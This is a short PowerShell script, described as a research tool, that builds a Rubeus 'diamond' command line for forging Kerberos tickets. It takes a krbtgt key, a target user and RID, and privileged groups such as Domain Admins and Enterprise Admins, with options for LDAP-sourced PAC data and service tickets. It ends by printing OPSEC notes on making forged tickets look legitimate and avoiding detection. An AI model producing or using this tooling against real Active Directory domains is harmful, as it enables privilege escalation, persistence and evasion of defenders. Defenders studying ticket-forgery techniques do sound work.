#!/usr/bin/env pwsh
# Rubeus Diamond Command Builder
# Security research tool for understanding diamond ticket command structure
# Usage: .\build-rubeus-diamond.ps1 -TargetUser "svc_sql" -TargetRID 1109 -KrbKey "<aes256>" -Groups "512,519"

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetUser,
    
    [Parameter(Mandatory=$true)]
    [int]$TargetRID,
    
    [Parameter(Mandatory=$true)]
    [string]$KrbKey,
    
    [Parameter(Mandatory=$false)]
    [string]$Groups = "512",
    
    [Parameter(Mandatory=$false)]
    [string]$LdapUser,
    
    [Parameter(Mandatory=$false)]
    [string]$LdapPassword,
    
    [Parameter(Mandatory=$false)]
    [switch]$Opsec,
    
    [Parameter(Mandatory=$false)]
    [switch]$ServiceTicket,
    
    [Parameter(Mandatory=$false)]
    [string]$ServiceSPN,
    
    [Parameter(Mandatory=$false)]
    [string]$ServiceKey,
    
    [Parameter(Mandatory=$false)]
    [string]$Base64TGT
)

$command = "./Rubeus.exe diamond"

# TGT delegation mode
$command += " /tgtdeleg"

# Target user
$command += " /ticketuser:$TargetUser"
$command += " /ticketuserid:$TargetRID"

# Groups
$command += " /groups:$Groups"

# krbtgt key
$command += " /krbkey:$KrbKey"

# LDAP context (recommended for realistic PAC)
if ($LdapUser -and $LdapPassword) {
    $command += " /ldap"
    $command += " /ldapuser:$LdapUser"
    $command += " /ldappassword:$LdapPassword"
}

# OPSEC flags
if ($Opsec) {
    $command += " /opsec"
}

$command += " /nowrap"

# Service ticket mode
if ($ServiceTicket) {
    if ($Base64TGT) {
        $command = $command.Replace(" /tgtdeleg", "")
        $command += " /ticket:$Base64TGT"
    }
    if ($ServiceSPN) {
        $command += " /service:$ServiceSPN"
    }
    if ($ServiceKey) {
        $command += " /servicekey:$ServiceKey"
    }
}

Write-Host "=== Rubeus Diamond Command ==="
Write-Host $command
Write-Host ""
Write-Host "=== Parameters ==="
Write-Host "Target User: $TargetUser (RID: $TargetRID)"
Write-Host "Groups: $Groups"
Write-Host "krbtgt Key: $KrbKey".Replace("$KrbKey", "[REDACTED]")
if ($LdapUser) { Write-Host "LDAP User: $LdapUser" }
if ($Opsec) { Write-Host "OPSEC Mode: Enabled" }
if ($ServiceTicket) { Write-Host "Service Ticket Mode: Enabled" }

Write-Host ""
Write-Host "=== OPSEC Notes ==="
Write-Host "- /ldap queries AD for real PAC context (recommended)"
Write-Host "- /opsec forces Windows-like AS-REQ flow with AES-only"
Write-Host "- /tgtdeleg avoids needing victim credentials"
Write-Host "- Ensure groups are plausible for target account"
Write-Host "- Use /ldap to extract GptTmpl.inf for policy compliance"
